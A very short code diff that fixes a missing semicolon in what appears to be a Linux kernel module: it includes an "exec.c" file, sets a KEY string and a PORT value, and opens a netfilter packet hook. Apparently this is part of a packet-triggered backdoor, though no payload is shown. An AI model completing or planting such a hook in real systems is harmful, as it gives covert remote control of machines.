@@ -1,7 +1,7 @@
 #include "exec.c"
 
 const char* KEY = "POET";
-const char* PORT = "5858"
+const char* PORT = "5858";
 
 static unsigned int my_nf_hookfn(void *priv,
               struct sk_buff *skb,
